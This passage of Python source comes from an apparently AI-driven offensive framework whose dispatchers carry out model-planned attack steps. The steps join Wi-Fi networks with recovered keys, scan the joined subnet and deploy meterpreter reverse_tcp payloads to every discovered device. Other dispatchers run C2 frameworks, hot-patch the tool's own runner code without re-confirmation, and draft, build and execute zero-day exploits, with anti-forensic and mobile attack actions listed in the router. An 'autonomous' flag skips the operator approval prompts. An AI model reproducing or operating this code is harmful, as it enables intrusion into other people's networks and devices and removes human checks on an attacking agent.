        psk = args.get("psk") or args.get("cred") or self._access_creds(report)
        iface = (args.get("interface") or args.get("iface")
                 or seed.get("join_iface") or seed.get("iface")
                 or "wlan0")
        if not ssid or not psk:
            self._emit("[!] join_network: no ssid/psk (need access creds); skipping")
            report["skipped"].append("join_network: no creds")
            return
        if not self.confirm_fn(
                f"Join network '{ssid}' as {iface} using recovered PSK?"):
            self._emit("[-] join_network: blocked by confirm_fn")
            report["skipped"].append("join_network: blocked")
            return
        conf_dir = tempfile.mkdtemp(prefix="kfiosa_join_")
        conf = os.path.join(conf_dir, "wpa_supplicant.conf")
        try:
            with open(conf, "w") as f:
                f.write(
                    "ctrl_interface=/var/run/wpa_supplicant\n"
                    "network={\n"
                    f'    ssid="{ssid}"\n'
                    f'    psk="{psk}"\n'
                    "}\n")
        except Exception as e:  # noqa: BLE001
            report["executed"].append(
                {"desc": "join_network", "kind": "ai", "action": "join_network",
                 "tool": "wpa_supplicant", "result": {"ok": False, "error": str(e)}})
            return
        lhost = None
        subnet = None
        rc = None
        try:
            r = subprocess.run(
                ["wpa_supplicant", "-i", str(iface), "-c", conf, "-B"],
                capture_output=True, text=True, timeout=30)
            rc = r.returncode
            if rc == 0:
                dhcp = subprocess.run(
                    ["dhclient", str(iface)],
                    capture_output=True, text=True, timeout=30)
                # Best-effort: read the assigned address via `ip`.
                ip = subprocess.run(
                    ["ip", "-4", "-o", "addr", "show", str(iface)],
                    capture_output=True, text=True, timeout=5)
                m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)(/\d+)?",
                              ip.stdout or "")
                if m:
                    lhost = m.group(1)
                    if m.group(2):
                        subnet = lhost + m.group(2)
        except FileNotFoundError as e:
            res = {"ok": False, "method": "join_network",
                   "error": f"tool not installed: {e}", "lhost": None}
        except Exception as e:  # noqa: BLE001
            res = {"ok": False, "method": "join_network", "error": str(e)}
        else:
            res = {"ok": rc == 0 and bool(lhost), "method": "join_network",
                   "return_code": rc, "lhost": lhost, "subnet": subnet,
                   "ssid": ssid}
        self._emit(f"[+] join_network: ok={res.get('ok')} lhost={lhost}")
        if lhost:
            access = report.setdefault("access",
                {"achieved": True, "creds": psk, "session_id": None})
            access["achieved"] = True
            access["lhost"] = lhost
            if subnet:
                access["subnet"] = subnet
        entry = {"desc": f"join_network {ssid}", "kind": "ai",
                 "action": "join_network", "tool": "wpa_supplicant",
                 "result": res, "data": {"lhost": lhost} if lhost else {}}
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _dispatch_host_discovery(self, step: Dict[str, Any], seed: Dict[str, Any],
                                 report: Dict[str, Any]) -> None:
        """AI ``host_discovery`` step: arp-scan / nmap -sn the subnet the
        operator just joined; parse hosts (IP, MAC, vendor) into
        ``report["access"]["devices"]``. Never raises."""
        import subprocess
        args = step.get("args", {}) or {}
        subnet = (args.get("subnet") or args.get("target")
                  or report.get("access", {}).get("subnet")
                  or seed.get("subnet"))
        if not subnet:
            self._emit("[!] host_discovery: no subnet (join first); skipping")
            report["skipped"].append("host_discovery: no subnet")
            return
        if not self.confirm_fn(f"Run host discovery on {subnet}?"):
            self._emit("[-] host_discovery: blocked by confirm_fn")
            report["skipped"].append("host_discovery: blocked")
            return
        out = ""
        tool = "nmap"
        try:
            # arp-scan is faster on a local L2 we just joined.
            r = subprocess.run(["arp-scan", "-l", "-I",
                                args.get("iface", "wlan0")],
                               capture_output=True, text=True, timeout=60)
            out = f"{r.stdout or ''}\n{r.stderr or ''}"
            if r.returncode != 0 or "arp-scan" not in (r.stdout or ""):
                tool = "nmap"
                r2 = subprocess.run(["nmap", "-sn", str(subnet)],
                                    capture_output=True, text=True, timeout=120)
                out = f"{r2.stdout or ''}\n{r2.stderr or ''}"
        except FileNotFoundError:
            res = {"ok": False, "method": "host_discovery",
                   "error": "neither arp-scan nor nmap installed", "devices": []}
            report["executed"].append(
                {"desc": "host_discovery", "kind": "ai",
                 "action": "host_discovery", "tool": tool, "result": res})
            return
        except Exception as e:  # noqa: BLE001
            res = {"ok": False, "method": "host_discovery", "error": str(e),
                   "devices": []}
            report["executed"].append(
                {"desc": "host_discovery", "kind": "ai",
                 "action": "host_discovery", "tool": tool, "result": res})
            return
        devices = self._parse_hosts(out)
        res = {"ok": bool(devices), "method": "host_discovery", "tool": tool,
               "devices": devices, "count": len(devices)}
        access = report.setdefault("access",
            {"achieved": True, "creds": None, "session_id": None})
        access["devices"] = devices
        self._emit(f"[+] host_discovery: found {len(devices)} device(s)")
        entry = {"desc": f"host_discovery {subnet}", "kind": "ai",
                 "action": "host_discovery", "tool": tool, "result": res}
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _parse_hosts(self, out: str) -> List[Dict[str, Any]]:
        """Parse live hosts from arp-scan / nmap -sn output.

        arp-scan lines: ``<IP>\t<MAC>\t<vendor>``.
        nmap -sn lines: ``Nmap scan report for <host>`` and
        ``MAC Address: <MAC> (<vendor>)``.
        """
        hosts: List[Dict[str, Any]] = []
        last_ip: Optional[str] = None
        for line in (out or "").splitlines():
            line = line.strip()
            # arp-scan: IP  MAC  vendor (tab/space separated)
            m = re.match(
                r"(\d+\.\d+\.\d+\.\d+)\s+([0-9A-Fa-f:]{17})\s*(.*)$", line)
            if m:
                hosts.append({"ip": m.group(1), "mac": m.group(2),
                              "vendor": m.group(3).strip()})
                continue
            # nmap -sn
            m = re.match(r"Nmap scan report for (?:[\w.-]+\s+)?"
                         r"(\d+\.\d+\.\d+\.\d+)", line)
            if m:
                last_ip = m.group(1)
                continue
            m = re.match(r"MAC Address:\s*([0-9A-Fa-f:]{17})\s*\((.*)\)", line)
            if m and last_ip:
                hosts.append({"ip": last_ip, "mac": m.group(1),
                              "vendor": m.group(2).strip()})
        # De-dup by (ip, mac).
        seen = set()
        uniq = []
        for h in hosts:
            k = (h.get("ip"), h.get("mac"))
            if k in seen:
                continue
            seen.add(k)
            uniq.append(h)
        return uniq

    def _dispatch_deploy_payload(self, step: Dict[str, Any], seed: Dict[str, Any],
                                 report: Dict[str, Any]) -> None:
        """AI ``deploy_payload`` step: stage a polymorphic payload per
        discovered device via ``post_exploit_runner.run_per_device_chain``,
        one persistent external window per device (each ACCEPT-gated)."""
        args = step.get("args", {}) or {}
        devices = args.get("devices")
        if not devices:
            devices = report.get("access", {}).get("devices") or []
        if not devices:
            self._emit("[!] deploy_payload: no devices discovered; run host_discovery first")
            report["skipped"].append("deploy_payload: no devices")
            return
        runner = getattr(self, "post_exploit_runner", None)
        if runner is None or not hasattr(runner, "run_per_device_chain"):
            self._emit("[!] deploy_payload: no post_exploit_runner with run_per_device_chain")
            report["skipped"].append("deploy_payload: no runner")
            return
        lhost = args.get("lhost") or report.get("access", {}).get("lhost") or "0.0.0.0"
        lport = args.get("lport") or 4444
        if not self.confirm_fn(
                f"ACCEPT deploy polymorphic payloads to {len(devices)} "
                f"discovered device(s) (listener {lhost}:{lport})?"):
            self._emit("[-] deploy_payload: blocked by confirm_fn")
            report["skipped"].append("deploy_payload: blocked")
            return
        try:
            res = runner.run_per_device_chain(
                devices, lhost=lhost, lport=lport,
                external_terminal=self.external_terminal,
                on_event=self._emit,
                payload=args.get("payload",
                                 "linux/x86/meterpreter/reverse_tcp"),
            )
        except Exception as e:  # noqa: BLE001
            res = {"error": str(e), "devices": [], "staged": 0, "declined": 0}
            self._emit(f"[!] deploy_payload runner failed: {e}")
        self._emit(
            f"[+] deploy_payload: staged={res.get('staged', 0)} "
            f"declined={res.get('declined', 0)}"
        )
        entry = {"desc": f"deploy_payload {len(devices)} devices",
                 "kind": "ai", "action": "deploy_payload",
                 "tool": "post_exploit_runner", "result": res}
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _dispatch_live_edit(self, step: Dict[str, Any], seed: Dict[str, Any],
                            report: Dict[str, Any]) -> None:
        """AI ``live_edit`` step: apply a runtime AST patch to a runner
        method. The per-step ACCEPT already fired in ``_walk_ai_step``;
        we do NOT re-confirm here.

        Args schema (step["args"]):
            patch_id:       str (must be in core.live_edit.test_patches)
            target_runner:  dotted module path
            target_method:  "_method" name on the module's class
            params:         dict of patch-specific parameters
            rationale:      str (already in step.rationale; the
                            PatchSpec prefers that)
        """
        from core.live_edit import PatchSpec, apply_patch
        args = step.get("args", {}) or {}
        patch_id = args.get("patch_id")
        target_runner = args.get("target_runner")
        target_method = args.get("target_method")
        if not patch_id or not target_runner or not target_method:
            self._emit("[!] live_edit: missing patch_id / target_runner / target_method")
            report["skipped"].append("live_edit: missing args")
            return
        spec = PatchSpec(
            target_runner=target_runner,
            target_method=target_method,
            patch_id=patch_id,
            params=args.get("params", {}),
            rationale=step.get("rationale") or args.get("rationale") or "AI proposed live_edit",
        )
        try:
            overlay = apply_patch(spec, confirm_fn=None)
        except Exception as e:  # noqa: BLE001
            overlay = None
            self._emit(f"[!] live_edit: apply raised: {e!r}")
        if overlay is None:
            self._emit(f"[-] live_edit: refused (validation/gate failure) for {patch_id!r}")
            report["skipped"].append(f"live_edit refused: {patch_id}")
            return
        self._emit(f"[+] live_edit: applied {patch_id!r} -> {overlay}")
        entry = {
            "desc": f"live_edit {patch_id} on {target_runner}.{target_method}",
            "kind": "ai", "action": "live_edit",
            "tool": target_runner, "result": {"ok": True, "overlay": overlay,
                                              "patch_id": patch_id},
        }
        report["executed"].append(entry)
        # Record the patch into seed so the re-planner sees it on next failure
        seed.setdefault("live_edits", []).append({
            "patch_id": patch_id,
            "target_runner": target_runner,
            "target_method": target_method,
            "overlay": overlay,
        })

    def _dispatch_tool_install(self, step: Dict[str, Any], seed: Dict[str, Any],
                               report: Dict[str, Any]) -> None:
        """AI ``tool_install`` step: install a missing tool from
        core.tool_installer. The per-step ACCEPT already fired in
        ``_walk_ai_step``; we do NOT re-confirm here.

        Args schema (step["args"]):
            tool:    str (the binary name to install)
            auto:    bool (default False; bypass per-install confirm?)
        """
        from core.tool_installer import maybe_install, TOOL_CATALOG
        args = step.get("args", {}) or {}
        tool = args.get("tool")
        if not tool:
            self._emit("[!] tool_install: missing `tool` in args")
            report["skipped"].append("tool_install: no tool")
            return
        if tool not in TOOL_CATALOG:
            self._emit(f"[!] tool_install: {tool!r} not in catalog; refuse")
            report["skipped"].append(f"tool_install not in catalog: {tool}")
            return
        try:
            ok = maybe_install(tool, auto=bool(args.get("auto", False)))
        except Exception as e:  # noqa: BLE001
            ok = False
            self._emit(f"[!] tool_install raised: {e!r}")
        if ok:
            self._emit(f"[+] tool_install: {tool!r} installed")
        else:
            self._emit(f"[-] tool_install: {tool!r} install failed (see core/tool_installer/_log.json)")
        entry = {
            "desc": f"tool_install {tool}",
            "kind": "ai", "action": "tool_install",
            "tool": "core.tool_installer",
            "result": {"ok": ok, "tool": tool},
        }
        report["executed"].append(entry)
        seed.setdefault("tool_installs", []).append({"tool": tool, "ok": ok})

    def _dispatch_c2_framework(self, step: Dict[str, Any],
                                seed: Dict[str, Any],
                                report: Dict[str, Any]) -> None:
        """Run a cloned C2 framework's REPL via
        ``core.c2.executor.run_c2_framework``.

        Per-step ACCEPT/CANCEL gate has already fired in
        ``_walk_ai_step``; this dispatcher does NOT re-confirm.

        The dispatcher NEVER fabricates session / beacon / task
        data. If the framework binary is not on PATH, the
        executor returns ``{ok: False, error: "..."}`` and we
        pass that through unchanged. Harvested credential
        values from ``args.env`` are passed via env vars, never
        as argv tokens (the never-inline ground rule).
        """
        from core.c2.executor import run_c2_framework
        args = step.get("args") or {}
        framework = args.get("framework")
        commands = args.get("commands")
        extra_argv = args.get("extra_argv") or []
        env = args.get("env") or {}
        timeout_seconds = float(args.get("timeout_seconds", 30.0))
        if not framework:
            entry = {
                "desc": "c2_framework (missing framework arg)",
                "kind": "ai", "action": "c2_framework",
                "tool": "core.c2.executor",
                "result": {"ok": False,
                           "error": "args.framework is required"},
            }
            report["executed"].append(entry)
            return
        try:
            result = run_c2_framework(
                framework, commands=commands,
                extra_argv=extra_argv, env=env,
                timeout_seconds=timeout_seconds,
            )
        except Exception as e:  # noqa: BLE001
            result = {"ok": False, "error": f"c2 executor raised: {e}",
                      "framework": framework}
        entry = {
            "desc": f"c2_framework {framework}",
            "kind": "ai", "action": "c2_framework",
            "tool": "core.c2.executor",
            "result": result,
        }
        report["executed"].append(entry)

    def _dispatch_poly_adapt(self, step: Dict[str, Any],
                             seed: Dict[str, Any],
                             report: Dict[str, Any]) -> None:
        """Run a polymorphic-grammar or target-adaptive-picker companion
        (Phase 2.4 §H). The companion returns a {pick, rationale} or
        {variants, primary} envelope; the next real chain step then
        applies the picked variant. The companion itself is never
        destructive; downstream steps that consume the result are
        gated by their own risk level.
        """
        from core.refactors import (
            list_poly_adapt_methods,
            run_poly_adapt,
        )
        args = step.get("args", {}) or {}
        method = (
            args.get("method")
            or args.get("name")
            or step.get("method")
            or step.get("name")
            or ""
        )
        if not method:
            self._emit("[!] poly_adapt: missing method/name in step")
            entry = {
                "desc": step.get("desc", "poly_adapt"),
                "kind": "ai",
                "action": "poly_adapt",
                "method": method,
                "result": {
                    "ok": False,
                    "error": "poly_adapt step missing method/name",
                },
            }
            report["executed"].append(entry)
            return
        if method not in list_poly_adapt_methods():
            self._emit(
                f"[!] poly_adapt: unknown method {method!r}"
            )
            entry = {
                "desc": step.get("desc", "poly_adapt"),
                "kind": "ai",
                "action": "poly_adapt",
                "method": method,
                "result": {
                    "ok": False,
                    "error": (
                        f"unknown poly_adapt method {method!r}; "
                        f"available: {list_poly_adapt_methods()}"
                    ),
                },
            }
            report["executed"].append(entry)
            return
        result = run_poly_adapt(method, args)
        self._emit(
            f"[+] poly_adapt {method}: ok={result.get('ok')}"
        )
        entry = {
            "desc": step.get("desc", f"poly_adapt {method}"),
            "kind": "ai",
            "action": "poly_adapt",
            "method": method,
            "result": result,
        }
        report["executed"].append(entry)

    def _walk_ai_step(self, step: Dict[str, Any], seed: Dict[str, Any],
                      report: Dict[str, Any], *, autonomous: bool) -> None:
        """Execute a single AI-generated step.

        Actions:
          - ``mcp_call``: route through ``mcp_client.call(tool, args)``
            when wired in, else fall through to the legacy
            ``_execute_step`` path which knows how to dispatch on
            the tool name.
          - ``zero_day_propose``: ask ``zero_day_proposer`` to draft
            a concept. Operator ACK required before the draft is
            persisted as ``acked``; default-deny on cancel/timeout.
          - ``post_exploit``: drive ``post_exploit_runner.run_auto_post_exploit_chain``
            (per-step ACCEPT inside).
          - ``external_terminal``: spawn a tool in the external
            terminal using ``launch_step`` (per-step ACCEPT).
          - ``run_tool``/``parse``/``decide``: fall through to
            ``_execute_step`` for back-compat.

        The risk_level drives the ACCEPT message wording (e.g.
        "ACCEPT INTRUSIVE step?" for intrusive steps) so the
        operator sees the risk class before ACKing.
        """
        action = step.get("action", "mcp_call")
        tool = step.get("tool")
        args = step.get("args", {}) or {}
        risk = step.get("risk_level", "intrusive")
        rationale = step.get("rationale", "")
        expected = step.get("expected_outcome", "")
        optional = bool(step.get("optional"))

        # Build a rich one-line description for the activity log and
        # the ACCEPT prompt.
        desc = (
            f"{action}"
            + (f" {tool}" if tool else "")
            + (f" args={json.dumps(args, default=str)[:200]}" if args else "")
            + (f" — {rationale}" if rationale else "")
        )

        if optional:
            self._emit(
                f"[*] AI STEP (OPTIONAL) ({action}, {risk}): {desc[:240]}"
            )
        else:
            self._emit(
                f"[*] AI STEP ({action}, {risk}): {desc[:240]}"
            )

        # Per-step ACCEPT, with risk-level wording. Optional steps are
        # marked in the prompt so the operator can tell an optional tail
        # (e.g. the 0-day generator) from a mandatory one; the
        # ``{risk.upper()}`` substring is preserved either way so the
        # risk class is always visible (and existing risk-level tests
        # still match).
        if not autonomous:
            if optional:
                prompt = (
                    f"ACCEPT (OPTIONAL) {risk.upper()} step? {desc[:400]}"
                    + (f"\n  expected: {expected}" if expected else "")
                    + " — declining skips this optional step; the chain continues."
                )
            else:
                prompt = (
                    f"ACCEPT {risk.upper()} step? {desc[:400]}"
                    + (f"\n  expected: {expected}" if expected else "")
                )
            accept = self.confirm_fn(prompt)
            if not accept:
                self._emit(f"[-] CANCELLED: {desc[:200]}")
                report["skipped"].append(desc)
                if optional:
                    report["optional_declined"].append(desc)
                return

        # Dispatch on action.
        if action == "zero_day_propose":
            self._dispatch_zero_day(step, seed, report)
            return
        if action == "zero_day_build":
            self._dispatch_zero_day_build(step, seed, report)
            return
        if action == "zero_day_execute":
            self._dispatch_zero_day_execute(step, seed, report)
            return
        if action in zero_day_algorithms_action_names():
            self._dispatch_zero_day_algorithm(step, seed, report)
            return
        if action == "post_exploit":
            self._dispatch_auto_post_exploit(step, seed, report)
            return
        if action == "external_terminal":
            self._dispatch_external_terminal(step, seed, report)
            return
        if action == "mt7921e_test_injection":
            self._dispatch_mt7921e_test_injection(step, seed, report)
            return
        if action == "mt7921e_inject":
            self._dispatch_mt7921e_inject(step, seed, report)
            return
        if action == "external_inject":
            self._dispatch_external_inject(step, seed, report)
            return
        if action == "recon_probe":
            self._dispatch_recon_probe(step, seed, report)
            return
        if action == "ble_probe":
            self._dispatch_ble_probe(step, seed, report)
            return
        if action == "ble_attack":
            self._dispatch_ble_attack(step, seed, report)
            return
        if action == "wifi_attack":
            self._dispatch_wifi_attack(step, seed, report)
            return
        if action == "post_exploit_ext":
            self._dispatch_post_exploit_ext(step, seed, report)
            return
        if action == "post_exploit_anti_forensic":
            self._dispatch_post_exploit_anti_forensic(step, seed, report)
            return
        if action == "microsoft_attack":
            self._dispatch_microsoft_attack(step, seed, report)
            return
        if action == "android_attack":
            self._dispatch_android_attack(step, seed, report)
            return
        if action == "ios_attack":
            self._dispatch_ios_attack(step, seed, report)
            return
        if action == "live_target":
            self._dispatch_live_target(step, seed, report)
            return
        if action == "extended_wifi":
            self._dispatch_extended_wifi(step, seed, report)
            return
        if action == "ble_post_exploit":
            self._dispatch_ble_post_exploit(step, seed, report)
            return
        if action == "extended_ble":
            self._dispatch_extended_ble(step, seed, report)
            return
        if action == "osint_probe":
            self._dispatch_osint_probe(step, seed, report)
            return
        if action == "osint_ext":
            self._dispatch_osint_ext(step, seed, report)
            return
        if action == "osint_module":
            self._dispatch_osint_module(step, seed, report)
            return
        if action == "forensic_module":
            self._dispatch_forensic_module(step, seed, report)
            return
            return
        if action == "post_exploit_probe":
            self._dispatch_post_exploit_probe(step, seed, report)
            return
        if action == "open_shell":
            self._dispatch_open_shell(step, seed, report)
            return
        if action == "open_post_access_tui":
            self._dispatch_open_post_access_tui(step, seed, report)
            return
        if action == "open_ble_tui":
            self._dispatch_open_ble_tui(step, seed, report)
            return
        if action == "open_network_tui":
            self._dispatch_open_network_tui(step, seed, report)
            return
        if action == "cve_to_exploit":
            self._dispatch_cve_to_exploit(step, seed, report)
            return
        if action == "cve_to_exploit_batch":
            self._dispatch_cve_to_exploit_batch(step, seed, report)
            return
        if action == "run_toolbox":
            self._dispatch_run_toolbox(step, seed, report)
            return
        if action == "run_python_lib":
            self._dispatch_run_python_lib(step, seed, report)
            return
        if action == "kismet_scan":
            self._dispatch_kismet_scan(step, seed, report)
            return
        if action == "crack":
            self._dispatch_crack(step, seed, report)
            return
        if action == "crack_gpu":
            self._dispatch_crack_gpu(step, seed, report)
            return
        if action == "pmkid":
            self._dispatch_pmkid(step, seed, report)
            return
        if action == "wps_pixie":
            self._dispatch_wps_pixie(step, seed, report)
            return
        if action == "wps_online":
            self._dispatch_wps_online(step, seed, report)
            return
        if action == "join_network":
            self._dispatch_join_network(step, seed, report)
            return
        if action == "host_discovery":
            self._dispatch_host_discovery(step, seed, report)
            return
        if action == "deploy_payload":
            self._dispatch_deploy_payload(step, seed, report)
            return
        if action == "live_edit":
            self._dispatch_live_edit(step, seed, report)
            return
        if action == "tool_install":
            self._dispatch_tool_install(step, seed, report)
            return
        if action == "c2_framework":
            self._dispatch_c2_framework(step, seed, report)
            return
        if action == "poly_adapt":
            self._dispatch_poly_adapt(step, seed, report)
            return
        if action == "mcp_call":
            if self.mcp_client is not None:
                try:
                    res = self.mcp_client.call(tool, args)
                    self._emit(f"[+] mcp_call {tool}: ok={res.get('ok')}")
                    entry = {
                        "desc": desc, "kind": "ai", "action": action,
                        "tool": tool, "result": res,
                    }
                    report["executed"].append(entry)
                    self._record_access(report, entry)
                    # A session_id in the result flips report["access"];
                    # the end-of-chain gain-access hook
                    # (_maybe_run_gain_access_hooks) then drives auto
                    # post-exploit + opens the interactive session — one
                    # uniform path instead of an inline trigger here.
                    return
                except Exception as e:
                    self._emit(f"[!] mcp_client.call({tool}) failed: {e}; falling through")
            # No MCP client or the call raised — fall through to the
            # legacy path which dispatches on the tool name. We map
            # the AI step into a legacy-shaped step with ``desc`` so
            # the existing _execute_step can do its job.
            legacy_step = {
                "desc": desc,
                "kind": "real",
                # _execute_step dispatches on these for the wifi case;
                # the AI tool name is reused as the action label.
                "action": tool or "mcp_call",
                "tool": tool,
                "args": args,
                "bssid": args.get("bssid") or seed.get("bssid"),
                "channel": args.get("channel") or seed.get("channel"),
                "iface": args.get("interface") or args.get("iface") or self.interface,
                "interface": args.get("interface") or args.get("iface") or self.interface,
                "cap_file": args.get("cap_file") or args.get("output"),
                "expected_runtime_seconds": step.get("expected_runtime_seconds"),
                "external": risk in ("intrusive", "destructive"),
            }
            res = self._execute_step(legacy_step, seed)
            self._emit(f"[+] {tool or action}: {res}")
            entry = {
                "desc": desc, "kind": "ai", "action": action,
                "tool": tool, "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            return
        # parse / decide / run_tool — fall through.
        legacy_step = {
            "desc": desc,
            "kind": "real" if action == "run_tool" else "info",
            "action": tool or action,
            "tool": tool,
            "args": args,
        }
        if action == "run_tool":
            res = self._execute_step(legacy_step, seed)
        else:
            # parse / decide are info-only
            res = f"(info, not executed) {action}"
            self._emit(f"[i] {res}")
        entry = {
            "desc": desc, "kind": "ai", "action": action,
            "tool": tool, "result": res,
        }
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _dispatch_zero_day(self, step: Dict[str, Any], seed: Dict[str, Any],
                           report: Dict[str, Any]) -> None:
        """Ask ``zero_day_proposer`` to draft a concept. The draft is
        persisted as ``pending``; the operator must ACK explicitly via
        the proposer path (ack_draft) to flip it to ``acked``."""
        if self.zero_day_proposer is None:
            self._emit("[!] zero_day_propose step but no zero_day_proposer wired in")
            report["skipped"].append(step.get("rationale", "zero_day_propose"))
            return
        try:
            recon = step.get("args", {}) or {}
            # Allow the AI step to override the target.
            target = recon.pop("target", None) or seed
            concept = self.zero_day_proposer.propose(
                target=target, recon=recon,
                draft_id=step.get("args", {}).get("draft_id"),
            )
            self._emit(
                f"[+] 0-day concept drafted: {concept.title} "
                f"(class={concept.vulnerability_class}, "
                f"confidence={concept.confidence}); draft_id={concept.draft_id} "
                f"status=pending — operator must ACK via ack_draft()"
            )
            report["zero_day_drafts"].append(concept.to_dict())
            report["executed"].append({
                "desc": f"zero_day_propose: {concept.title}",
                "kind": "ai", "action": "zero_day_propose",
                "tool": "zero_day_proposer",
                "result": {
                    "draft_id": concept.draft_id,
                    "status": concept.status,
                    "title": concept.title,
                    "confidence": concept.confidence,
                },
            })
        except Exception as e:
            self._emit(f"[!] zero_day_propose failed: {e}")
            report["skipped"].append(f"zero_day_propose: {e}")

    def _dispatch_zero_day_build(self, step: Dict[str, Any], seed: Dict[str, Any],
                                 report: Dict[str, Any]) -> None:
        """Build a 0-day exploit from an ACK'd concept via
        ``zero_day_exploit_builder``. Refuses to build from a concept
        that has not been ACK'd by the operator. Best-effort runs the
        ``zero_day_classifier`` over the generated code and attaches
        triage when the classifier reports available=True, then
        re-saves via the builder's shared store."""
        if self.zero_day_exploit_builder is None:
            self._emit(
                "[!] zero_day_build step but no zero_day_exploit_builder wired in"
            )
            report["skipped"].append(step.get("rationale", "zero_day_build"))
            return
        try:
            args = step.get("args", {}) or {}
            draft_id = args.get("draft_id")
            # When the chain tail doesn't name a specific draft (the
            # optional attach tail can't know the id at plan time),
            # resolve to the most-recent ACK'd concept for the target.
            if draft_id is None and self.zero_day_proposer is not None:
                try:
                    acked = self.zero_day_proposer.store.list("acked")
                    if acked:
                        pick = max(
                            acked,
                            key=lambda c: getattr(c, "acked_at", None)
                            or getattr(c, "created_at", 0) or 0,
                        )
                        draft_id = pick.draft_id
                except Exception as e:
                    self._emit(f"[!] zero_day_build: could not pick concept: {e}")
            # The concept is loaded from the proposer's store (the
            # builder consumes concepts; the proposer owns the drafts).
            concept = self.zero_day_proposer.store.get(draft_id)
            if concept is None:
                self._emit("[!] zero_day_build: concept not found")
                report["skipped"].append("zero_day_build: concept not found")
                return
            if concept.status != "acked":
                self._emit(
                    f"[!] zero_day_build: concept {draft_id} not ACK'd "
                    f"(status={concept.status}) — refusing to build"
                )
                report["skipped"].append(
                    f"zero_day_build: concept {draft_id} not acked"
                )
                return
            # Recon chain for grounding: prefer the live recon carried by
            # the AI step (a recon chain emits zero_day_build with the
            # recon it just gathered); fall back to the concept's captured
            # recon_context. Merge so concept-time signal is never lost.
            live_recon = args.get("recon") or {}
            recon_chain = {**(concept.recon_context or {}), **live_recon}
            tools_override = args.get("tools")  # optional prebuilt tools block
            exploit = self.zero_day_exploit_builder.build(
                concept, recon=recon_chain, tools=tools_override,
            )
            # Best-effort triage via the classifier. Never raises out
            # of this block — a classifier failure is non-fatal.
            triage = None
            if self.zero_day_classifier is not None:
                try:
                    score = self.zero_day_classifier.score(exploit.code[:4000])
                    if isinstance(score, dict) and score.get("available") is True:
                        exploit.triage = score
                        triage = score
                        self.zero_day_exploit_builder.store.save(exploit)
                except Exception as ce:
                    self._emit(f"[!] zero_day classifier failed: {ce}")
            self._emit(
                f"[+] 0-day exploit built: {exploit.title} "
                f"(lang={exploit.language}) exploit_id={exploit.exploit_id} "
                f"status=drafted"
            )
            report["zero_day_drafts"].append(exploit.to_dict())
            report["executed"].append({
                "desc": f"zero_day_build: {exploit.title}",
                "kind": "ai", "action": "zero_day_build",
                "tool": "zero_day_exploit_builder",
                "result": {
                    "exploit_id": exploit.exploit_id,
                    "status": exploit.status,
                    "title": exploit.title,
                    "language": exploit.language,
                    "triage": triage,
                },
            })
        except Exception as e:
            self._emit(f"[!] zero_day_build failed: {e}")
            report["skipped"].append(f"zero_day_build: {e}")

    def _dispatch_zero_day_execute(self, step: Dict[str, Any],
                                   seed: Dict[str, Any],
                                   report: Dict[str, Any]) -> None:
        """Execute a built 0-day exploit via ``zero_day_exploit_runner``.

        The per-step ACCEPT already fired in :meth:`_walk_ai_step` for
        this step (risk_level is expected to be ``destructive`` so the
        ACCEPT wording reflects that). The runner ALSO performs its own
        mandatory CRITICAL gate inside ``run()`` — that is intentional
        double-checking for the destructive action, not redundancy.
        """
        if self.zero_day_exploit_runner is None:
            self._emit(
                "[!] zero_day_execute step but no zero_day_exploit_runner wired in"
            )
            report["skipped"].append(step.get("rationale", "zero_day_execute"))
            return
        try:
            args = step.get("args", {}) or {}
            target = args.get("target") or seed
            exploit_id = args.get("exploit_id")
            draft_id = args.get("draft_id")
            # Phase 2.2.G: when the chain tail doesn't name a specific
            # exploit (the optional attach tail can't know the id at
            # plan time), resolve to the most-recent drafted/acked
            # exploit. First try a fingerprint-aware match on the
            # operator's ACK'd concept, then fall back to recency.
            if (exploit_id is None and draft_id is None
                    and self.zero_day_exploit_builder is not None):
                try:
                    from core.ai_backend.chain import (
                        _resolve_zero_day_draft_id,
                    )
                    fp_draft_id = _resolve_zero_day_draft_id(
                        target if isinstance(target, dict) else {},
                    )
                    if fp_draft_id:
                        draft_id = fp_draft_id
                        self._emit(
                            f"[chain-planner] zero_day_execute: resolved "
                            f"fingerprint-matching ACK'd concept {draft_id!r}"
                        )
                except Exception as e:  # noqa: BLE001
                    self._emit(
                        f"[chain-planner] zero_day_execute: fingerprint "
                        f"resolve failed: {e}"
                    )
            if (exploit_id is None and draft_id is None
                    and self.zero_day_exploit_builder is not None):
                try:
                    runnable = [
                        e for e in self.zero_day_exploit_builder.store.list()
                        if getattr(e, "status", "") in ("drafted", "acked")
                    ]
                    if runnable:
                        pick = max(
                            runnable,
                            key=lambda e: getattr(e, "created_at", 0) or 0,
                        )
                        exploit_id = pick.exploit_id
                except Exception as e:
                    self._emit(f"[!] zero_day_execute: could not pick exploit: {e}")
            # If we resolved a draft_id (fingerprint match) but still
            # don't have an exploit_id, look up the most-recent exploit
            # built for that draft_id.
            if exploit_id is None and draft_id:
                try:
                    candidates = [
                        e for e in self.zero_day_exploit_builder.store.list()
                        if getattr(e, "draft_id", None) == draft_id
                        and getattr(e, "status", "") in ("drafted", "acked")
                    ]
                    if candidates:
                        pick = max(
                            candidates,
                            key=lambda e: getattr(e, "created_at", 0) or 0,
                        )
                        exploit_id = pick.exploit_id
                        self._emit(
                            f"[chain-planner] zero_day_execute: resolved "
                            f"draft_id={draft_id!r} -> exploit_id={exploit_id!r}"
                        )
                    else:
                        # Honest-degrade: fingerprint match found an ACK'd
                        # concept but no exploit was built for it yet.
                        self._emit(
                            f"[!] zero_day_execute: no ACK'd concept for this "
                            f"target; run zero_day_propose + zero_day_build first "
                            f"(draft_id={draft_id!r})"
                        )
                        report["skipped"].append(
                            f"zero_day_execute: no built exploit for "
                            f"ACK'd draft {draft_id!r}"
                        )
                        return
                except Exception as e:  # noqa: BLE001
                    self._emit(
                        f"[!] zero_day_execute: draft_id->exploit_id "
                        f"resolve failed: {e}"
                    )
            # builder.store is the shared exploit store; duck-typed.
            exploit = self.zero_day_exploit_builder.store.get(exploit_id)
            if exploit is None:
                self._emit("[!] zero_day_execute: exploit not found")
                report["skipped"].append("zero_day_execute: exploit not found")
                return
            if exploit.status not in ("drafted", "acked"):
                self._emit(
                    f"[!] zero_day_execute: exploit {exploit_id} not in runnable "
                    f"state (status={exploit.status})"
                )
                report["skipped"].append(
